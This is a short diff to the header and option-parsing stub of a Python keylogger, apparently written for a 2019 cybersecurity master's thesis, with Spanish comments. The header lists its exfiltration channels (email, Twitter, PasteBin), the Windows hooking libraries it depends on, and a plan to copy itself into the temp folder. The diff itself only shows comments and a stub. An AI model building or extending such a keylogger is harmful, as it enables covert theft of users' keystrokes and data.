@@ -6,18 +6,19 @@
 #   Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
 #
 #   Autor ..........:   Gabriel Marti Fuentes,  gabimarti@gmail.com
-#   Fecha ..........:   19/05/2019
+#   Fecha inicio ...:   19/05/2019
 #
 #   Caracteristicas :   Envio por Correo
 #                       Posteo en Twitter
 #                       Paste en PasteBin
 #
-#   pip install pywin32
-#   pip install pyWinhook
-#   pip install win32gui
-#   pip install pastebin --- no
-#   pip install requests
-#   pip install wxPython
+#   Módulos / Estensiones necesarios:
+#       pip install pywin32
+#       pip install pyWinhook
+#       pip install win32gui
+#       pip install pastebin --- no verificado aún 
+#       pip install requests
+#       pip install wxPython
 #
 #   to do
 #           - auto clone app / copy to windows tmp
@@ -126,7 +127,7 @@ Control parametros linea de comando, para instalar, configurar, ajustar.
 NO IMPLEMENTADO TODAVIA
 '''
 def parse_params():
-    usage = "usage: %prog [options] arg1 arg2"
+    usage = "Uso: %prog [options] arg1 arg2"
     parser = OptionParser(usage=usage)
     parser.add_option("-v", "--verbose",
                       action="store_true", dest="verbose", default=True,
